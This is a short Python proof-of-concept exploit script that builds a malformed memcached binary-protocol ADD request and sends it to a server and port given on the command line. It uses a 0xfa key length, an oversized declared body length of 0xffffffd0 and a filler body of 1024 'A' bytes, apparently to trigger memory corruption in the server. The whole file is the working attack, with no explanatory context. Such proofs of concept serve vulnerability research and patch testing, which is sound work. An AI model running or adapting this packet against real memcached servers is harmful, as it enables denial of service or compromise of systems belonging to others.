import struct
import socket
import sys


MEMCACHED_REQUEST_MAGIC = "\x80"
OPCODE_ADD = "\x02"
key_len = struct.pack("!H",0xfa)
extra_len = "\x08"
data_type = "\x00"
vbucket = "\x00\x00"
body_len = struct.pack("!I",0xffffffd0)
opaque = struct.pack("!I",0)
CAS = struct.pack("!Q",0)
extras_flags = 0xdeadbeef
extras_expiry = struct.pack("!I",0xe10)
body = "A"*1024

packet = MEMCACHED_REQUEST_MAGIC + OPCODE_ADD + key_len + extra_len
packet += data_type + vbucket + body_len + opaque + CAS
packet += body
if len(sys.argv) != 3:
	print "./poc_20168705.py <server> <port>"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1],int(sys.argv[2])))
s.sendall(packet)
print s.recv(1024)
s.close()